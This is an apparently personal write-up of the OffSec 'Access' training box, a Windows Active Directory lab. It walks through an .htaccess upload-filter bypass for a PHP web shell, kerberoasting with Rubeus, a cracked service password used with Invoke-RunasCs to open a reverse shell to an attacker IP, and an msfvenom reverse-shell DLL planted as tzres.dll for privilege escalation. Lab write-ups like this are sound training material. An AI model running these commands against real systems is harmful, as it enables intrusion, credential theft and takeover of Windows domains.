---
title: "Access"
date: 2026-04-04
draft: false
description: "OffSec Access writeup"
tags: ["windows", "hard", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Access

## Overview

- **OS:** Windows AD
- **IP:** 192.168.226.187
- **Difficulty:** Hard
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

upoaded .htaccess to bypass filter and got rce and then privesc by kerberoasting and SeManageVolume priv.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 12:17:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
```

## Dirbusting

```

```

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 997.png" >}}

{{< figure src="image 998.png" >}}

and the uploads directory is exposed

{{< figure src="image 999.png" >}}

## Exploitation

path is likely to upload a revshell hidden as a image

{{< figure src="image 1000.png" >}}

hmm lets try to change the extensionname

{{< figure src="image 1001.png" >}}

none of them seem to work , so lets see if we can upload a .htaccess file and allow ourselves

{{< figure src="image 1002.png" >}}

now if we change the name of the php file to .dork we shud be able to upload

{{< figure src="image 1003.png" >}}

{{< figure src="image 1004.png" >}}

we need to figure out how to get the creds for svc_mssql

lets get the SPN

```
Object Name =  krbtgt
DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       kadmin/changepw

Object Name =  MSSQL
DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       MSSQLSvc/DC.access.offsec

PS C:\Users\Public\Documents> 
```

greeat now we can 

```
.\\Rubeus.exe kerberoast /outfile:kerberoast.hashes
```

{{< figure src="image 1005.png" >}}

lets crack it

{{< figure src="image 1006.png" >}}

that was instant 

lets use Runas to switch users

```
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.197:443
```

{{< figure src="image 1007.png" >}}

and we hve a new priv now, SeManageVolume

we use a script that gives us write perms over C drive and then follow this to get admin shell

Using dllref by Siren Security, we identified that tzres.dll is associated with systeminfo. Normally, running systeminfodisplays system details, but if we inject a malicious tzres.dll, we can hijack the process. This allows us to execute a reverse shell, leading to privilege escalation and higher system access.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.xxx LPORT=443 -f dll -o tzres.dll
```

and then just type systeminfo and boom
